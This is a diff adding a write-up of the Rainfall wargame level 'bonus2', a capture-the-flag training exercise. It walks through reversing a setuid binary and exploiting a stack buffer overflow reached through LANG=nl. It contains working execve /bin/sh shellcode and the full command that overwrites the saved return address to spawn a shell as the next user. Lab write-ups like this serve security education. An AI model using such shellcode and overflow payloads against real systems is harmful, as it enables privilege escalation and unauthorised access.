@@ -1,0 +1,70 @@
+# Rainfall Bonus 2 Guide
+This guide will walk you through the process of finding the password for the `bonus3` user.
+
+## 1. Examine your environment
+
+`ls -la` : Lists files and their permissions in the current directory.
+```bash
+-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
+```
+
+We can see that the `bonus2` binary has the `setuid` bit set, which means that it runs with the permissions of the owner of the file. In this case, the owner is `bonus3`. It executable by the `users` group, our current group.
+
+We execute the binary to see what it does. It waiting fon an input, but every times it prints `Hello <arg>`.
+```bash
+bonus2@RainFall:~$ ./bonus2 john doe
+Hello john
+```
+
+## 2. Reverse engineering
+
+We will use Ghidra to reverse engineer the binary.
+You can find the analysis in [Ressources/ghidra.c](Ressources/ghidra.c), and the reconstructed C code in [source.c](source.c).
+
+## 3. Analysis
+
+We find a main function, which is very long. You will find the simplified source code in the [source.c](source.c) file.
+We will use the simplified source code to explain the vulnerability.
+
+This programm take two arguments, a greeting message is displayed based on the lang and the first argument.
+
+## 4. Exploitation
+
+So if we write a shellcode in the first argument, we might be able to exploit the program.
+
+We have to find a way to overwrite the saved EIP.
+In order to do this, we analyze the ghidra file output <FILE>, and we can see that the `local_60` has a length of 40.
+We can now assume that if we inject a shellcode, we might be able to exploit the program.
+
+We need to put the LANG env var to `nl` to reach the saved EIP of `main`.
+
+Run:
+```bash
+export LANG=nl
+gdb ./bonus2
+(gdb) r $(python -c 'print "a"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag 
+...
+Program received signal SIGSEGV, Segmentation fault.
+0x38614137 in ?? ()
+...
+```
+
+Now that we found the address, we can go to Wiremask (lien), in order to find the offest, which is 23.
+
+We can now run the follwing command to find the adrress where the shellcode has been written:
+```bash
+export LANG=nl
+bonus2@RainFall:~$ ltrace ./bonus2 $(python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "a"*(40-21)')  $(python -c 'print "a"*23 + "abcd"')
+__libc_start_main(0x8048529, 3, 0xbffff6b4, 0x8048640, 0x80486b0 <unfinished ...>
+strncpy(0xbffff5b0, "1\311\367\341\260\013Qh//shh/bin\211\343\315\200aaaaaaaaaaa"..., 40)                            = 0xbffff5b0
+```
+Within the `strncpy`, we now found where our shellcode is stored.
+We now replace the `abcd` string at the end of the command, with the given address above `0xbffff5b0`.
+
+Our command now looks like this:
+```bash
+export LANG=nl
+./bonus2 $(python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "a"*(40-21)')  $(python -c 'print "a"*23 + "\xb0\xf5\xff\xbf"')
+```
+
+The bash is now open and we can access to following user.
